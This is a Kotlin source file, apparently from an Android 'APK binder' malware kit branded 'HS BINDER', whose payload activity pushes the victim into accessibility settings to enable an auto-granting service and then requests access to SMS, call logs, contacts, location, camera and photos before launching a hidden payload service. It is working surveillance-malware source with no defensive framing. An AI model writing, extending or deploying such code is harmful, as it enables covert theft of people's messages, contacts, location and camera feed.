package Com.devhs.apkbinder.payload

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.Gravity
import android.view.ViewGroup
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts

class PermissionGateActivity : Activity(), PayloadServiceHost {

    private var waitingA11y = false

    private val launcher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { proceed() }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val cfg = (application as? PayloadApp)?.readConfig()
        PayloadState.config = cfg
        if (cfg == null) {
            finish()
            return
        }
        setContentView(buildUi())

        if (PayloadState.enabled("auto_grant") && !a11yOn()) {
            openA11y()
        } else {
            request()
        }
    }

    override fun onResume() {
        super.onResume()
        if (waitingA11y) {
            waitingA11y = false
            HsLog.w("a11y back=" + a11yOn())
            request()
        }
    }

    private fun openA11y() {
        waitingA11y = true
        try {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        } catch (t: Throwable) {
            waitingA11y = false
            request()
        }
    }

    private fun a11yOn(): Boolean = try {
        val want = packageName + "/" + HsAccessibility::class.java.name
        val cur = Settings.Secure.getString(
            contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: ""
        cur.split(':').any { it.equals(want, true) }
    } catch (t: Throwable) {
        false
    }

    private fun request() {
        val perms = requiredPermissions()
        if (perms.isEmpty()) {
            proceed()
            return
        }
        launcher.launch(perms)
    }

    private fun on(k: String): Boolean = try {
        val f = PayloadState.config
        val a = f?.optJSONArray("features")
        var hit = false
        if (a != null) for (i in 0 until a.length()) if (a.optString(i) == k) hit = true
        hit
    } catch (t: Throwable) {
        false
    }

    private fun granted(p: String): Boolean =
        checkSelfPermission(p) == PackageManager.PERMISSION_GRANTED

    private fun declared(p: String): Boolean = try {
        val pi = packageManager.getPackageInfo(packageName, PackageManager.GET_PERMISSIONS)
        pi.requestedPermissions?.contains(p) == true
    } catch (t: Throwable) {
        false
    }

    private fun requiredPermissions(): Array<String> {
        val list = ArrayList<String>()

        if (on("gallery")) {
            if (Build.VERSION.SDK_INT >= 33) list.add(Manifest.permission.READ_MEDIA_IMAGES)
            else list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        if (on("sms")) list.add(Manifest.permission.READ_SMS)
        if (on("calls")) {
            list.add(Manifest.permission.READ_CALL_LOG)
            list.add(Manifest.permission.READ_PHONE_STATE)
        }
        if (on("contacts") || on("contact_details")) list.add(Manifest.permission.READ_CONTACTS)
        if (on("device")) list.add(Manifest.permission.READ_PHONE_STATE)
        if (on("location") || on("wifi")) {
            list.add(Manifest.permission.ACCESS_FINE_LOCATION)
            list.add(Manifest.permission.ACCESS_COARSE_LOCATION)
        }
        if (on("front_camera") || on("back_camera")) list.add(Manifest.permission.CAMERA)
        if (Build.VERSION.SDK_INT >= 33) list.add(Manifest.permission.POST_NOTIFICATIONS)

        return list.filter { declared(it) && !granted(it) }.toTypedArray()
    }

    private fun proceed() {
        try {
            startService(Intent(this, PayloadService::class.java))
        } catch (t: Throwable) {
        }
        finish()
    }

    private fun buildUi(): LinearLayout {
        val root = LinearLayout(this)
        root.orientation = LinearLayout.VERTICAL
        root.gravity = Gravity.CENTER
        root.setPadding(48, 48, 48, 48)
        root.background = GradientDrawable().apply {
            setColor(Color.parseColor("#05070A"))
            cornerRadius = 48f
        }
        root.layoutParams = ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.WRAP_CONTENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        )

        root.addView(TextView(this).apply {
            text = "HS BINDER"
            setTextColor(Color.parseColor("#00E5C0"))
            textSize = 22f
            gravity = Gravity.CENTER
        })
        root.addView(TextView(this).apply {
            text = "Granting permissions..."
            setTextColor(Color.parseColor("#E8F6F4"))
            textSize = 13f
            gravity = Gravity.CENTER
            setPadding(0, 20, 0, 40)
        })
        root.addView(Button(this).apply {
            text = "Grant"
            setTextColor(Color.parseColor("#05070A"))
            background = GradientDrawable().apply {
                setColor(Color.parseColor("#00E5C0"))
                cornerRadius = 30f
            }
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            )
            setOnClickListener { request() }
        })
        return root
    }
}
